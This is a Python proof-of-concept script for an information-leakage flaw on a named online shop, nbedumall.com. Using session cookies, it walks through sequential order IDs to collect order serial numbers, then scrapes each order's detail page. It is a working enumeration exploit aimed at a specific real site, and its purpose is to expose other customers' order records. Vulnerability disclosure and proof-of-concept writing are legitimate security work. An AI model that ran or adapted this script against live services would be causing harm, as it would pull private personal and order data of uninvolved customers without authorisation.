import re
from argparse import ArgumentParser

import requests as req

FIND_ORDERSN_FROM_CREATE_ORDER_PAGE_REGEX = re.compile(r'<strong>([0-9]{12})</strong>')

FIND_DETAILS_FROM_DETAILS_PAGE_REGEX = re.compile(r'<div class="order_intro">((?:.|\n)*?)</div>')


def main():
    parser = ArgumentParser(description='PoC to the information leakage vulnerability found in nbedumall.com. AUTHOR: '
                                        'CSharperMantle',
                            add_help=True)
    parser.add_argument('-m', '--mode', choices=['get_ordersn', 'get_details', 'surf_orderid'],
                        default='fetch_all', required=True,
                        action='store', dest='mode', metavar='MODE', help='working mode')
    parser.add_argument('-c', '--cookies',
                        action='store', dest='cookies', metavar='COOKIES', help='cookies to use', required=True)
    parser.add_argument('-p', '--param',
                        action='store', dest='param', metavar='PARAM', help='param to the mode chosen', required=True)
    parser.add_argument('--create-order-url',
                        default='https://www.nbedumall.com/order_create_success.html?orderid=@@REPLACE@@',
                        action='store', dest='create_order_url', metavar='URL',
                        help='url to order_create_success.htm')
    parser.add_argument('--details-url',
                        default='https://www.nbedumall.com/member/order_detail.html?ordersn=@@REPLACE@@&groupbuyid=0',
                        action='store', dest='details_url', metavar='URL',
                        help='url to order_detail.htm')
    args = parser.parse_args()

    param = args.param
    cookie = args.cookies
    cookie_dict = {i.split("=")[0]: i.split("=")[-1] for i in cookie.split(";")}
    details_url = args.details_url
    create_order_url = args.create_order_url
    mode = args.mode

    if mode == 'get_ordersn':
        print(get_ordersn_by_orderid(param, create_order_url, cookie_dict))
    elif mode == 'get_details':
        print(get_details_by_ordersn(param, details_url, cookie_dict))
    elif mode == 'surf_orderid':
        for idx in range(10000, int(param)):
            idx_str = str(idx).zfill(5)  # the orderid argument is now a 5-digit number
            ordersn = get_ordersn_by_orderid(idx_str, create_order_url, cookie_dict)
            print((idx_str, ordersn))


def get_ordersn_by_orderid(orderid, create_order_url, cookies_dict):
    result = req.get(create_order_url.replace('@@REPLACE@@', orderid), cookies=cookies_dict)
    result_text = result.text
    result.close()
    try:
        serial = FIND_ORDERSN_FROM_CREATE_ORDER_PAGE_REGEX.findall(result_text)[0]
        return serial
    except IndexError:
        return None


def get_details_by_ordersn(ordersn, details_url, cookies_dict):
    result = req.get(details_url.replace('@@REPLACE@@', ordersn), cookies=cookies_dict)
    result_text = result.text
    result.close()
    try:
        details = FIND_DETAILS_FROM_DETAILS_PAGE_REGEX.findall(result_text)[0]
        return details
    except IndexError:
        return None


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('KeyboardInterrupt caught, exiting...')
